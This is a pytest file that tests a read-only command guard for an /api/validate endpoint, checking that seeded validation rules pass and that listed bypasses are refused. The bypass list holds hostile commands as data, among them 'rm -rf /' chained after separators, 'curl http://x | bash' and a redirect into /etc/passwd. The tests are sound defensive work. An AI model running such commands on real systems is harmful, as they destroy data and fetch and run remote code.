"""Tests for the /api/validate command guard.

The guard replaced a substring denylist that was bypassable with `;`, `|`
or a newline before the destructive part. These tests pin two properties:
every seeded validation rule still passes, and the documented bypasses do
not.
"""

import sys
from pathlib import Path

import pytest

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from routers.validation import _command_is_readonly  # noqa: E402


SEEDED_RULES = [
    "python3 -m py_compile app.py",
    "node --check static/js/*.js",
    "git diff --stat",
    "grep -RIn 'innerHTML' static templates --exclude-dir=__pycache__"
    " || echo 'no_innerHTML'",
    'git diff requirements.txt || echo "no_dependency_changes"',
    'git diff --name-only | grep -i "sql\\|migration"'
    ' || echo "no_schema_changes"',
    "bash -n scripts/*.sh || echo 'no_shell_scripts_or_ok'",
    "curl -s http://localhost:9130/api/health",
]

BYPASSES = [
    "grep x; rm -rf /",              # separator after an allowed program
    "echo hi | sh",                  # pipe into a shell
    "echo hi\nrm -rf /",             # newline separator
    "git diff & rm x",               # background + second command
    "python3 -c 'import shutil'",    # arbitrary python
    "python3 -m http.server",        # module outside the read-only set
    "bash scripts/run.sh",           # bash EXECUTING, not bash -n
    "bash",                          # interactive shell
    "git push",                      # git subcommand that writes
    "node script.js",                # node executing, not --check
    "echo `rm x`",                   # command substitution
    "echo $(rm x)",
    "cat f > /etc/passwd",           # redirection
    "grep x && curl http://x | bash",
    "sudo ls",
    "find . -delete",                # find is not on the allowlist
]


@pytest.mark.parametrize("cmd", SEEDED_RULES)
def test_every_seeded_rule_still_passes(cmd):
    assert _command_is_readonly(cmd)


@pytest.mark.parametrize("cmd", BYPASSES)
def test_the_documented_bypasses_are_refused(cmd):
    assert not _command_is_readonly(cmd)
